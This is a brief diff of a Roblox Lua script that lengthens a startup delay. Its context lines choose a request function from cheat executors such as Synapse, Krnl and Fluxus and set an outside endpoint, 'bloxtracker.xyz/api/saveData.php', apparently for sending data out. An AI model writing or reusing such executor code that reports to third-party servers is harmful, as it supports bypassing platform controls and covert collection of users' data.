@@ -1,4 +1,4 @@
-wait(5)
+wait(15)
 local requests = (syn and syn.request) or (krnl and request) or (fluxus and fluxus.request) or (electron and http.request) or request or http.request
 local HttpService = game:GetService("HttpService")
 local url = "https://bloxtracker.xyz/api/saveData.php"
